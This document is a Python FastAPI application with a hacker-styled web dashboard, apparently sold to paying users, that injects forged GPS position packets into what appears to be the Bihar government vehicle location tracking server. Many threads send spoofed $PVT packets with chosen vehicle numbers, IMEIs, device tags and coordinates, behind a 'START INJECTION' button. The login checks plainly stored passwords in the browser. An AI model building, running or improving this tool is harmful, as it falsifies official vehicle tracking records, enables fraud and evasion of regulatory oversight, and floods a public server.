import socket, threading, time, requests, json, asyncio
from datetime import datetime, timedelta, timezone
from fastapi import FastAPI, BackgroundTasks
from fastapi.responses import HTMLResponse
import httpx 

app = FastAPI()

# --- 🚀 CONFIG ---
DB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com"
stop_event = threading.Event()
stop_event.set()
total_sent = 0
lock = threading.Lock()

DEFAULT_TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA", "GRL"]

# --- 🏎️ ENGINE (STRICT NUMBER FORMAT) ---
def handshake_worker(tag, imei, vno, lat, lon):
    global total_sent
    # Ensure coordinates are clean numbers for the packet string
    try:
        lat_val = float(lat)
        lon_val = float(lon)
    except: return

    while not stop_event.is_set():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(3)
                s.connect(("vlts.bihar.gov.in", 9999))
                while not stop_event.is_set():
                    for _ in range(15):
                        if stop_event.is_set(): break
                        now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
                        # 🔥 DATA PACKET (No extra quotes, strict formatting)
                        pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{lat_val:.7f},N,{lon_val:.7f},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*\\r\\n"
                        s.sendall(bytes(pkt, 'ascii'))
                        with lock: total_sent += 1
                        time.sleep(0.01)
                    time.sleep(0.1)
        except: time.sleep(1)

@app.get("/fetch_data")
async def fetch_data(vno: str):
    v_up = vno.upper().strip()
    async with httpx.AsyncClient() as client:
        try:
            r = await client.get(f"{DB_URL}/Data_Records/{v_up}.json?nocache={time.time()}")
            return r.json() or {"found": False}
        except: return {"found": False}

@app.get("/init")
async def init(v:str, i:str, lt:str, ln:str, t:str, background_tasks: BackgroundTasks):
    global total_sent
    if stop_event.is_set():
        v_up, t_up = v.upper().strip(), t.upper().strip()
        
        # 🎯 Force Float Conversion for Server
        try:
            lt_num = float(lt)
            ln_num = float(ln)
        except: return {"ok": False, "error": "Invalid Coords"}

        total_sent = 0
        stop_event.clear()
        now_ist = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
        
        # Save payload - Backend handles strict formatting
        payload = {
            "Vehicle_No": v_up, 
            "IMEI_No": str(i), 
            "Lat": f"{lt_num:.7f}", 
            "Lon": f"{ln_num:.7f}", 
            "Saved_Tag": t_up, 
            "Status": "Active", 
            "Time": now_ist.strftime('%H:%M:%S')
        }
        background_tasks.add_task(sync_data, v_up, t_up, payload)
        
        run_tags = list(DEFAULT_TAGS) if t_up == "ALL" else [t_up]
        if t_up == "ALL":
            try:
                r = requests.get(f"{DB_URL}/Global_Tags.json")
                extra = r.json()
                if extra: run_tags.extend(extra.keys())
            except: pass
        
        for tag in list(set(run_tags)):
            threading.Thread(target=handshake_worker, args=(tag,i,v_up,lt_num,ln_num), daemon=True).start()
    return {"ok": True}

async def sync_data(vno, tag, payload):
    async with httpx.AsyncClient() as client:
        await client.put(f"{DB_URL}/Data_Records/{vno}.json", json=payload)
        if tag != "ALL" and tag not in DEFAULT_TAGS:
            await client.put(f"{DB_URL}/Global_Tags/{tag}.json", json=True)

@app.get("/status")
def status(): return {"c": total_sent, "f": not stop_event.is_set()}

@app.get("/stop")
def stop(): stop_event.set(); return {"ok": True}

@app.get("/", response_class=HTMLResponse)
async def home():
    return """
    <html><head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ghop-Ghop GPS</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { background:#000; color:#0f0; font-family:monospace; margin:0; display:flex; flex-direction:column; align-items:center; min-height:100vh; }
        .login-box, .dashboard { width:95%; max-width:440px; border:2px solid #0f0; padding:15px; background:rgba(0,10,0,0.95); border-radius:15px; box-shadow: 0 0 25px #0f0; margin-top:20px; box-sizing: border-box; }
        .dashboard { display:none; }
        input, select { width:100%; background:#000; border:1px solid #333; color:#0f0; padding:12px; margin-top:10px; outline:none; text-transform:uppercase; font-size:16px; border-radius:5px; }
        .chk-group { display: flex; align-items: center; justify-content: flex-start; gap: 8px; margin-top: 15px; width: 100%; color: #fff; }
        .chk-group input { width: 22px !important; height: 22px !important; margin: 0 !important; cursor: pointer; }
        button { width:100%; padding:14px; margin-top:10px; cursor:pointer; border:1px solid #0f0; background:transparent; color:#0f0; font-weight:bold; border-radius:5px; }
        .progress-container { width:100%; height:12px; background:#111; margin-top:15px; border-radius:6px; display:none; border:1px solid #0f0; overflow:hidden; }
        #progress-bar { width:0%; height:100%; background: linear-gradient(90deg, #0f0, #004400); }
        .audit-box { display:flex; justify-content:space-between; background:rgba(0,40,0,0.5); border:1px solid #0f0; padding:8px; margin-top:10px; border-radius:5px; font-size:10px; color:#fff; text-align:center; }
        .audit-box b { display:block; color:#0f0; font-size:14px; }
        .user-wall { background:#001a00; border:1px solid #0f0; padding:10px; margin-top:10px; font-size:13px; display:none; color:red; border-radius:5px; width:100%; }
        #map { width:100%; height:250px; margin-top:15px; border:1px solid #0f0; border-radius:10px; }
        .nav { width:95%; max-width:440px; display:flex; justify-content:space-between; font-size:12px; margin-top:10px; color:#fff; }
    </style></head><body>

    <div class="login-box" id="loginScreen">
        <h1 style="text-align:center;font-size:24px;letter-spacing:5px;">Ghop-Ghop GPS</h1>
        <input type="text" id="m_num" placeholder="MOBILE NUMBER">
        <input type="password" id="m_pass" placeholder="PASSWORD">
        <div class="chk-group"><input type="checkbox" id="rem"> <label for="rem">Remember Me</label></div>
        <button onclick="login()" style="background:#0f0;color:#000;border:none;margin-top:20px;">ACCESS SYSTEM</button>
        <div style="text-align:center; margin-top:20px;"><a href="https://wa.me/917464010787" style="color:#007bff;text-decoration:none;font-weight:bold;">[ CONTACT ADMIN ]</a></div>
    </div>

    <div class="nav" id="dashNav" style="display:none;"><span>USER: <b id="u_name" style="color:#0f0"></b></span><span onclick="logout()" style="color:red;cursor:pointer;">[ LOGOUT ]</span></div>
    
    <div class="dashboard" id="dashScreen">
        <div class="audit-box"><div>OK<b id="a_ok">0</b></div><div>FAIL<b id="a_fail">0</b></div><div>ERROR<b id="a_err">0</b></div><div>TOTAL<b id="a_total">0</b></div></div>
        <div class="user-wall" id="u_wall"></div>
        <input type="text" id="v" onblur="smartFetch()" placeholder="VEHICLE NUMBER">
        <input type="text" id="i" placeholder="IMEI">
        <select id="tagSel" onchange="checkManual()">
            <option value="ALL">SEND ALL TAGS (DEFAULT)</option>
            <option value="MANUAL">+ ADD NEW TAG</option>
        </select>
        <input type="text" id="manTag" placeholder="ENTER NEW TAG NAME" style="display:none;">
        <div class="chk-group"><input type="checkbox" id="useDef" checked> <label for="useDef">Use Default Location (Profile)</label></div>
        <div style="display:flex;gap:5px;margin-top:10px;"><input type="text" id="lt" placeholder="LAT" oninput="updateMapManually()"><input type="text" id="ln" placeholder="LON" oninput="updateMapManually()"></div>
        <button onclick="getLocation()">[ GET CURRENT LOCATION ]</button>
        <button onclick="st()" id="startBtn" style="background:#0f0;color:#000;font-size:18px;border:none;">START INJECTION</button>
        <button onclick="sp()" style="color:red;border-color:red;">ABORT</button>
        <button onclick="resetInputs()" style="color:yellow;border-color:yellow;font-size:11px;">RESET SYSTEM</button>
        <div class="progress-container" id="p-cont"><div id="progress-bar"></div></div>
        <div id="map"></div>
        <div style="display:flex;justify-content:space-between;margin-top:15px;font-size:14px;"><span>SENT: <b id="c">0</b></span><span id="st_text" style="color:lime">IDLE</span></div>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        const DB = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com";
        const DEFAULT_TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA", "GRL"];
        let map, marker, curUser = null, mon = null;

        function initMap() { if (map) return; map = L.map('map').setView([20.59, 78.96], 5); L.tileLayer('https://{s}.tile.openstreetmap.fr/hot/{z}/{x}/{y}.png').addTo(map); marker = L.marker([20.59, 78.96]).addTo(map); }
        function updateMapManually() {
            let lat = parseFloat(document.getElementById('lt').value), lon = parseFloat(document.getElementById('ln').value);
            if(!isNaN(lat) && !isNaN(lon)) { map.setView([lat, lon], 14); marker.setLatLng([lat, lon]); }
        }

        async function loadGlobalTags() {
            try {
                let res = await fetch(`${DB}/Global_Tags.json?t=${Date.now()}`), data = await res.json() || {};
                let sel = document.getElementById('tagSel'), cur = sel.value;
                sel.innerHTML = '<option value="ALL">SEND ALL TAGS (DEFAULT)</option>';
                DEFAULT_TAGS.forEach(t => { let o = document.createElement('option'); o.value = t; o.innerText = t; sel.appendChild(o); });
                Object.keys(data).forEach(t => { if(!DEFAULT_TAGS.includes(t)) { let o = document.createElement('option'); o.value = t; o.innerText = t; sel.appendChild(o); } });
                let man = document.createElement('option'); man.value = "MANUAL"; man.innerText = "+ ADD NEW TAG"; sel.appendChild(man);
                if(cur) sel.value = cur;
            } catch(e) {}
        }

        async function login() {
            let n = document.getElementById('m_num').value.trim(), p = document.getElementById('m_pass').value.trim();
            let res = await fetch(`${DB}/users/${n}.json`), data = await res.json();
            if(data && data.password == p) { curUser = { ...data, mobile: n }; if(document.getElementById('rem').checked) localStorage.setItem('nitro_user', JSON.stringify(curUser)); showDash(); }
            else alert("WRONG PASSWORD");
        }

        window.onload = () => { let s = localStorage.getItem('nitro_user'); if(s){ curUser = JSON.parse(s); showDash(); } }

        function showDash() {
            document.getElementById('loginScreen').style.display='none'; document.getElementById('dashScreen').style.display='block';
            document.getElementById('dashNav').style.display='flex'; document.getElementById('u_name').innerText=curUser.mobile;
            initMap(); loadGlobalTags();
            fetch(`${DB}/user_messages/${curUser.mobile}.json?t=${Date.now()}`).then(r=>r.json()).then(m=>{
                if(m&&m.text){ let w=document.getElementById('u_wall'); w.innerHTML=`● <b>ADMIN UPDATE:</b><br><span>${m.text}</span>`; w.style.display='block'; }
            });
        }

        function checkManual() { document.getElementById('manTag').style.display = (document.getElementById('tagSel').value == "MANUAL") ? 'block' : 'none'; }

        async function smartFetch() {
            let v = document.getElementById('v').value.toUpperCase().trim();
            if(!v) return;
            let res = await fetch(`/fetch_data?vno=${v}&t=${Date.now()}`), d = await res.json();
            if(d.IMEI_No){
                document.getElementById('i').value = d.IMEI_No;
                let lat = document.getElementById('useDef').checked ? curUser.lat : (d.Lat || d.lat || "24.919211");
                let lon = document.getElementById('useDef').checked ? curUser.lon : (d.Lon || d.lon || "83.790586");
                document.getElementById('lt').value = parseFloat(lat).toFixed(7);
                document.getElementById('ln').value = parseFloat(lon).toFixed(7);
                if(d.Saved_Tag) { let sel = document.getElementById('tagSel'); if(!Array.from(sel.options).some(o => o.value == d.Saved_Tag)) await loadGlobalTags(); sel.value = d.Saved_Tag; }
                updateMapManually();
            }
        }

        function getLocation() {
            navigator.geolocation.getCurrentPosition(p=>{
                document.getElementById('lt').value = p.coords.latitude.toFixed(7);
                document.getElementById('ln').value = p.coords.longitude.toFixed(7);
                updateMapManually();
            }, null, {enableHighAccuracy:true});
        }

        function st() {
            let v=document.getElementById('v').value.trim(), i=document.getElementById('i').value.trim(), lt=document.getElementById('lt').value.trim(), ln=document.getElementById('ln').value.trim(), tag = document.getElementById('tagSel').value;
            if(!v || !i || !lt || !ln) return alert("FILL ALL BOXES!");
            if(tag == "MANUAL") { tag = document.getElementById('manTag').value.toUpperCase().trim(); if(!tag) return alert("ENTER TAG NAME!"); }
            if(mon) clearInterval(mon);
            fetch(`/init?v=${v}&i=${i}&lt=${lt}&ln=${ln}&t=${tag}`);
            document.getElementById('st_text').innerText="FIRING"; document.getElementById('p-cont').style.display="block";
            mon = setInterval(()=>{ fetch('/status').then(r=>r.json()).then(d=>{ document.getElementById('c').innerText=d.c; document.getElementById('progress-bar').style.width = (d.c % 100) + "%"; }); }, 1000);
        }

        async function sp() { fetch('/stop'); if(mon) clearInterval(mon); mon = null; document.getElementById('st_text').innerText="IDLE"; document.getElementById('p-cont').style.display="none"; }
        function resetInputs() { location.reload(); }
        function logout() { localStorage.removeItem('nitro_user'); location.reload(); }
    </script></body></html>
    """
